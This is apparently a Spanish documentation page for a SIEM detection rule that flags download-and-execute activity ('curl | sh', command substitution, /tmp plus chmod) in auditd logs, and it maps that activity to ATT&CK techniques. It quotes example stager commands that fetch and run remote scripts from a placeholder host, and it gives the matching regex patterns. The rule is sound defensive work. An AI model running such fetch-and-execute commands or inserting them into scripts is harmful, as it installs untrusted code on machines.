# Descarga y ejecución directa (curl | sh)

| | |
|---|---|
| ID | `e4ee2dcf-633b-4f68-8b80-428f9ba2d320` |
| Nombre | `descarga_y_ejecucion` |
| Nivel | alto |
| Tácticas | Comando y control, Ejecución |
| Técnicas | [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer · [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
| Fuente | auditd (`-S execve`) |

## Qué detecta

Descarga con `curl` o `wget` seguida de ejecución inmediata, en cualquiera de sus tres formas:

1. Tubería a una shell: `curl -fsSL http://x/i.sh | sh`, `wget -qO- http://x | sudo bash`.
2. Sustitución de comando o de proceso: `bash -c "$(curl -s http://x)"`, `sh <(wget -qO- http://x)`.
3. Descarga a `/tmp`, `/dev/shm` o `/var/tmp` seguida de `chmod` en la misma línea.

Es el stager de prácticamente todos los mineros y botnets para Linux.

## Técnica ATT&CK

T1105 por la transferencia de la herramienta; T1059.004 por su ejecución en la shell.

## Lógica

Tres expresiones regulares sobre `data.audit.execve.cmdline`:

- `selection_tuberia`: `\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b`
- `selection_sustitucion`: `\b(ba|z|da|k)?sh\b[^$]*(\$\(|<\()\s*(curl|wget)\b`
- `selection_temporal`: `\b(curl|wget)\b.*(/tmp/|/dev/shm/|/var/tmp/).*\bchmod\b`

Las regex exigen el nombre completo de la shell después de la tubería, así `| tee setup.sh` o `| grep ok` no disparan.

La tubería solo es visible cuando toda la línea llega en un único `execve` (`bash -c "curl ... | sh"`, un script, una webshell, una tarea cron). Escrita a mano en una shell interactiva, `curl ... | sh` son dos `execve` separados (`curl` y `sh`) y esta regla no la ve; ese caso queda para una correlación temporal entre ambos procesos.

## Falsos positivos conocidos

- Instaladores oficiales que documentan `curl | sh` (Homebrew, rustup, nvm, el script de Docker) ejecutados por administradores. Es un hábito que conviene erradicar; mientras tanto, acotar por `auid` o por dominio de origen.
- Pipelines de CI que descargan y ejecutan scripts de build en runners propios.

## Cómo probarla

```bash
detectionlab run samples/descarga_y_ejecucion/positivos.jsonl --solo-disparos
pytest -k descarga
```

Los negativos tienen `curl | tee`, descargas a `/tmp` sin `chmod`, `curl | jq`, `curl | grep` y `cat | sh` sin descarga.
